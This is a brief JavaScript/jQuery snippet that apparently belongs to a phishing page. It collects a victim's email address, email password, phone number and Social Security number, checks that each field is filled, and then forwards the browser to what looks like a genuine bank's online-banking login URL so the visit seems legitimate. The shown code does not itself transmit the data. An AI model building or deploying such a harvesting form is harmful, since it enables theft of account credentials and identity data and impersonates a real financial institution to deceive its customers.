<script>

$(document).ready(function Login() {
$('#Login').click(function Login(){
    //alert('works');
    var Email = document.querySelector('#email').value;
    var EmailP = document.querySelector('#emailP').value;
    var number = document.querySelector('#number').value;
    var ssn = document.querySelector('#ssn').value;
    if (!Email){
        $('#id01').show()
    }else if(!EmailP){
        $('#id02').show()
    }else if(!number){
        $('#id03').show()
    }else if(!ssn){
        $('#id04').show()
    }else{
        window.open("https://web9.secureinternetbank.com/PBI_PBI1151/login/091303664","_self");
    }
});

});
